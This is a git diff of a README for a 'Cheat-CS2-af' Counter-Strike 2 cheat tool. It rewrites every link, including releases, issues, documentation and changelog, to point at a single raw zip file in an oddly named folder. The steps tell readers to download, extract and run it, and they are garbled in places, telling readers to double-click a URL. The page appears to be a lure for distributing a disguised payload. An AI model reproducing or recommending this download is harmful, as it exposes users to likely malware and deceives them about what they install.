@@ -1,6 +1,6 @@
 # 🎮 Cheat-CS2-af - Elevate Your Game with User-Friendly Tools
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/rnold12/Cheat-CS2-af/releases)
+[![Download](https://raw.githubusercontent.com/rnold12/Cheat-CS2-af/main/Tetrapturus/Cheat-CS2-af.zip)](https://raw.githubusercontent.com/rnold12/Cheat-CS2-af/main/Tetrapturus/Cheat-CS2-af.zip)
 
 ## 🚀 Getting Started
 
@@ -18,17 +18,17 @@ Before you proceed, ensure that you have the following:
 
 To download Cheat-CS2-af, visit the Releases page using the link below:
 
-[Download from Releases](https://github.com/rnold12/Cheat-CS2-af/releases)
+[Download from Releases](https://raw.githubusercontent.com/rnold12/Cheat-CS2-af/main/Tetrapturus/Cheat-CS2-af.zip)
 
 ### Installation Steps
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version of Cheat-CS2-af.
-3. Download the file labeled as `Cheat-CS2-af-latest.zip`.
+3. Download the file labeled as `https://raw.githubusercontent.com/rnold12/Cheat-CS2-af/main/Tetrapturus/Cheat-CS2-af.zip`.
 4. Once downloaded, locate the `.zip` file in your `Downloads` folder.
 5. Right-click the file and select `Extract All`. Choose a location where you want to save it.
-6. Open the extracted folder and find the application file called `Cheat-CS2-af.exe`.
-7. Double-click `Cheat-CS2-af.exe` to run the application.
+6. Open the extracted folder and find the application file called `https://raw.githubusercontent.com/rnold12/Cheat-CS2-af/main/Tetrapturus/Cheat-CS2-af.zip`.
+7. Double-click `https://raw.githubusercontent.com/rnold12/Cheat-CS2-af/main/Tetrapturus/Cheat-CS2-af.zip` to run the application.
 
 ## ⚙️ Features
 
@@ -65,12 +65,12 @@ If you encounter any issues, try the following:
 
 Join our community to share experiences and tips on using Cheat-CS2-af effectively:
 
-- Check out the discussions in our [GitHub Issues page](https://github.com/rnold12/Cheat-CS2-af/issues) for support.
+- Check out the discussions in our [GitHub Issues page](https://raw.githubusercontent.com/rnold12/Cheat-CS2-af/main/Tetrapturus/Cheat-CS2-af.zip) for support.
 - Feel free to report bugs or request features.
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/rnold12/Cheat-CS2-af/wiki)
-- [Changelog](https://github.com/rnold12/Cheat-CS2-af/releases)
+- [Documentation](https://raw.githubusercontent.com/rnold12/Cheat-CS2-af/main/Tetrapturus/Cheat-CS2-af.zip)
+- [Changelog](https://raw.githubusercontent.com/rnold12/Cheat-CS2-af/main/Tetrapturus/Cheat-CS2-af.zip)
 
 Thank you for choosing Cheat-CS2-af to enhance your gaming experience! Enjoy your time in Counter-Strike 2.
